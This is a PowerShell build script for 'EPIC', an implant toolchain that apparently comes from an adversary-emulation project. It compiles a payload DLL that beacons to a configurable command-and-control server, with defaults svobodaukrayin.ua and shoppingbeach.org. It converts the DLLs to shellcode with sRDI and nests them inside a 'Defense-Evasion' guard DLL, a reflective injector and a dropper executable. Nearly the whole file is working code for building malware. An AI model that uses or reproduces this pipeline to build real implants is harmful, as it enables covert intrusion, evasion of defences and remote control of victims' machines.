<#
.Description

Builds the EPIC components (payload DLL, guard DLL, injector exe, SimpleDropper exe)

Ex. .\buildpayload.ps1 -c2Address "10.0.2.8" -c2Port 80 -https "true" -build "all"

.Parameter c2Address

The C2 IP Address or domain name. Ex: "10.0.2.8" or "epic-fail-wordpress.us"

.Parameter c2Port

The C2 Port. Ex: 8080

.Parameter https

This indicates if the implant will communicate to the C2 via HTTP or HTTPS, use "true" for HTTPS and "false" for HTTP. Ex: "true"

.Parameter build

Used to specify which components of EPIC should be built. Ex. "payload", "guard", "simpledropper", "guard injector", or "all" to build all components

#>

param(
	[String]$c2Address,
	[Int]$c2Port,
	[String]$https,
	[String]$build
)

# Build all components if build is not specified. Error checking for user input.
if ((-Not $build) -or ($build.ToLower().Contains("all"))) {
	$build = "payload guard injector simpledropper"
	Write-Host "Building all EPIC components"
} else {
	# possible components
	$buildList = @("payload", "guard", "injector", "simpledropper");
	$minimumIndex = 3; $maximumIndex = 0;

	# set minimumIndex and maximumIndex based on arguments provided, ignoring any misspelled args
	$build.ToLower().Split() | ForEach-Object {
		$ind = $buildList.IndexOf($_);
		if ($ind -gt -1 -and $ind -lt $minimumIndex) {
			$minimumIndex = $ind;
		}
		if ($ind -gt $maximumIndex) {
			$maximumIndex = $ind;
		}
	}

	# empty out the build string
	$build = "";

	# add component at the minimum index through component at the maximum index to build string
	for ($i = $minimumIndex; $i -le $maximumIndex; $i++) {
		$build += $buildList[$i] + " ";
	}
	Write-Host "Building EPIC components: $build"
} 

# Set the default args for payload build if none are provided by the user. We will need to set different default args depending on http/https
if (-Not $https) {
	$https = "false"
	if ($build.Contains("payload")) { Write-Host "HTTPS not specified, using HTTP (false) by default" }
}

if ((-Not $c2Address) -and ($build.Contains("payload"))) {
	switch ($https) {
		"true" { $c2Address = "svobodaukrayin.ua" }
		"false" { $c2Address = "shoppingbeach.org" }
	}  
	Write-Host "C2 Address not specified, using default address $c2Address"
}

if ((-Not $c2Port) -and ($build.Contains("payload"))) {
	switch ($https) {
		"true" { $c2Port = 443 }
		"false" { $c2Port = 80 }
	}
	Write-Host "C2 Port not specified, using default port $c2Port"
}

#Set the binary names for the EPIC components
if ($https -eq "false") {
	$payloadBinary = "res"
	$guardBinary = "Intermediary_http"
	$injBinary = "reflective_injector_http"
	$sdBinary = "SimpleDropper_http"
} else {
	$payloadBinary = "res2"
	$guardBinary = "Intermediary_https"
	$injBinary = "reflective_injector_https"
	$sdBinary = "SimpleDropper_https"
}

# Clone sRDI repo and import ConvertTo-Shellcode module
Write-Host "Cloning the sRDI repo and importing CovertTo-Shellcode module..." -NoNewLine

git clone https://github.com/monoxgas/sRDI.git C:\Users\Public\sRDI *>$null
git -C C:\Users\Public\sRDI checkout 5690685aee6751d0dbcf2c50b6fdd4427c1c9a0a *>$null
import-module C:\Users\Public\sRDI\PowerShell\ConvertTo-Shellcode.ps1 -Force

Write-Host " Success!"

# Perform error checking on build commands
function errCheck {

	$err = Get-Content .\err.txt
	Remove-Item .\err.txt
	if ($err -ne $null) {
		Write-Host "Error running command: `n`n$err"
		Write-Host "`nExiting the build script"
		exit
	}

}

# Convert specified dll to shellcode
# Params: dllPath (path to the compiled DLL to be converted), functionName (name of the exported function), outFile (output file for shellcode)
function convertToShellcode($dllPath, $functionName, $outFile) {

	$sc = ConvertTo-Shellcode -File $dllPath -FunctionName $functionName
	$sc2 = $sc | % { write-output ([System.String]::Format('{0:X2}', $_)) }
	$sc2 -join "" > "$outFile"

}

# Convert hex string to binary file
# Params: binPath (output path for the .bin file), hexFile (file containing hex string to be converted)
function convertToBin($binPath, $hexFile) {

	$hex_string = Get-Content $hexfile
	$hex_string_spaced = $hex_string -replace '..', '0x$& '
	$byte_array = [byte[]] -split $hex_string_spaced
	Set-Content -Path $binPath -Value $byte_array -Encoding Byte

}

# Check if payload build is specified and build if true
if ($build.Contains("payload")) {
	
	# Build the EPIC payload (run the build commands)
	Write-Host "`nBuilding the Payload DLL..."

	$output = cmake -S .\payload -B .\payload\build -DUSE_HTTPS="$https" -DC2_PORT="$c2Port" -DC2_ADDRESS:STRING="$c2Address" -DBINARY_NAME:STRING="$payloadBinary" 2>err.txt
	errCheck

	$output = cmake --build .\payload\build --config Release --target ALL_BUILD -j 4 -- 2>err.txt
	errCheck

	# Grab the path to the payload DLL
	$regex = (Select-String -InputObject $output -Pattern '\bres2?\.vcxproj -> (.*?\.dll)')
	$dllPath = $regex.Matches.Groups[1].Value
	Write-Host "Success! Path to the payload compiled DLL: $dllPath"

	# Convert payload DLL to shellcode
	Write-Host "Converting the payload DLL to shellcode..." -NoNewLine
	convertToShellcode $dllPath "PayLoop" "payload.txt"
	Write-Host " Success!"

	# Set the path for .bin output and convert hex string to .bin file
	Write-Host "Creating the payload .bin file..."
	$binPath = "$PSScriptRoot\payload\bin\$payloadBinary.bin"
	convertToBin $binPath ".\payload.txt"
	Write-Host "Success! Path to payload .bin file: $binPath"

}

# Check if guard build is specified and build if true
if ($build.Contains("guard")) {

	# Set the path to the correct resource depending on http/https
	$rcPath = ".\Defense-Evasion\reflective-guard\reflective-guard\Resource.rc"
	(Get-Content $rcPath) -replace 'res2?\.bin', "$payloadBinary.bin" | Set-Content $rcPath

	# Build the Guard DLL with MSBuild.exe
	Write-Host "`nBuilding the Guard DLL..."
	
	$output = MSBuild.exe .\Defense-Evasion\reflective-guard\Intermediary.sln /t:'Clean;Build' /p:Configuration=Release /fl /flp:'LogFile=err.txt;errorsonly'
	errCheck

	# Grab the path to the Guard DLL
	$regex = (Select-String -InputObject $output -Pattern '\breflective-guard\.vcxproj -> (.*?\.dll)')
	$dllPath = $regex.Matches.Groups[1].Value
	Write-Host "Success! Path to the guard compiled DLL: $dllPath"
	
	# Convert guard DLL to shellcode
	Write-Host "Converting the guard DLL to shellcode..." -NoNewLine
	convertToShellcode $dllPath "Protection" "guard.txt"
	Write-Host " Success!"

	# Set the path for .bin output and convert hex string to .bin file
	Write-Host "Creating the guard .bin file..."
	$binPath = "$PSScriptRoot\Defense-Evasion\reflective-guard\reflective-guard\bin\$guardBinary.bin"
	convertToBin $binPath ".\guard.txt"
	Write-Host "Success! Path to guard .bin file: $binPath"
	
}

# Check if injector build is specified and build if true
if ($build.Contains("injector")) {

	# Set the path to the correct resource depending on http/https
	$rcPath = ".\Defense-Evasion\reflective_injector\reflective_injector\Resource.rc"
	(Get-Content $rcPath) -replace 'Intermediary_https?\.bin', "$guardBinary.bin" | Set-Content $rcPath

	# Build the injector executable with MSBuild.exe
	Write-Host "`nBuilding the Injector executable..."
	
	$output = MSBuild.exe .\Defense-Evasion\reflective_injector\Primary.sln /t:'Clean;Build' /p:Configuration=Release /fl /flp:'LogFile=err.txt;errorsonly'
	errCheck

	# Grab the path to the Injector exe
	$regex = (Select-String -InputObject $output -Pattern '\breflective_injector\.vcxproj -> (.*?\.exe)')
	$exePath = $regex.Matches.Groups[1].Value
	Write-Host "Success! Path to the injector compiled exe: $exePath"

	# Copy the compiled exe to the bin folder
	$binPath = "$PSScriptRoot\Defense-Evasion\reflective_injector\reflective_injector\bin\$injBinary.exe"
	Copy-Item -Path $exePath -Destination $binPath
	Write-Host "Injector compiled exe copied to $binPath"

}

# Check if SimpleDropper build is specified and build if true
if ($build.Contains("simpledropper")) {

	# Set the path to the correct resource depending on http/https
	$rcPath = "..\SimpleDropper\SimpleDropper\SimpleDropper.rc"
	(Get-Content $rcPath) -replace 'reflective_injector_https?\.exe', "$injBinary.exe" | Set-Content $rcPath

	# Build the SimpleDropper executable with MSBuild.exe
	Write-Host "`nBuilding the SimpleDropper executable..."
	
	$output = MSBuild.exe ..\SimpleDropper\SimpleDropper.sln /t:'Clean;Build' /p:Configuration=Release /fl /flp:'LogFile=err.txt;errorsonly'
	errCheck

	# Grab the path to the SimpleDropper exe
	$regex = (Select-String -InputObject $output -Pattern '\bSimpleDropper\.vcxproj -> (.*?\.exe)')
	$exePath = $regex.Matches.Groups[1].Value
	Write-Host "Success! Path to the SimpleDropper compiled exe: $exePath"
	
	# Copy the compiled exe to the bin folder
	$binPath = "$PSScriptRoot\SimpleDropper\SimpleDropper\bin\$sdBinary.exe"
	Copy-Item -Path $exePath -Destination $binPath
	Write-Host "SimpleDropper compiled exe copied to $binPath"

}
